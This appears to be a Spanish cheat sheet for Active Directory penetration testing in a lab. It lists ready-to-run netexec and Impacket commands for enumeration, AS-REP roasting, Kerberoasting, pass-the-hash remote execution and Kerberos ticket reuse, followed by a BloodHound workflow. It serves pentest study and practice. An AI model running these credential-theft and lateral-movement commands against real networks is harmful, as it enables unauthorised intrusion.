# Chuleta: Active Directory

## Preparación

```bash
ip route
date
dig @10.10.10.10 _ldap._tcp.dc._msdcs.corp.local SRV
```

Confirma DC, dominio DNS, NetBIOS, FQDN, hora y resolución antes de Kerberos.

## Enumeración inicial

```bash
nmap -p53,88,135,139,389,445,464,636,3268,5985 -sV 10.10.10.10
nxc smb 10.10.10.10
nxc smb 10.10.10.10 -u '' -p '' --shares
```

## Cuenta válida

```bash
nxc smb 10.10.10.0/24 -u edu -p 'Laboratorio123!' -d CORP
nxc ldap 10.10.10.10 -u edu -p 'Laboratorio123!' -d CORP --users
nxc ldap 10.10.10.10 -u edu -p 'Laboratorio123!' -d CORP --groups
```

## Roasting

```bash
GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 \
  -usersfile usuarios.txt -no-pass -format hashcat -outputfile asrep.hashes

GetUserSPNs.py 'corp.local/edu:Laboratorio123!' \
  -dc-ip 10.10.10.10 -request -outputfile tgs.hashes
```

Identifica el formato antes de usar Hashcat.

## Hash y ticket

```bash
nxc smb 10.10.10.20 -u edu -H '<NTHASH>' -d CORP
wmiexec.py -hashes ':<NTHASH>' 'corp.local/edu@10.10.10.20'

export KRB5CCNAME=/ruta/edu.ccache
klist
smbclient.py -k -no-pass corp.local/edu@SRV01.corp.local
```

## BloodHound

- recolectar con identidad y métodos documentados;
- importar;
- marcar nodos controlados;
- buscar ruta a Tier Zero;
- leer cada arista;
- verificar manualmente;
- volver a recolectar tras cambios.

## Matriz de credenciales

| Identidad | Tipo | Origen | SMB | WinRM | RDP | Admin local | AD |
|---|---|---|---|---|---|---|---|
| | | | | | | | |

## Tras cada salto

```text
usuario/grupos -> host/red -> servicios/sesiones -> secretos
-> AD/ACL -> BloodHound -> siguiente hipótesis
```

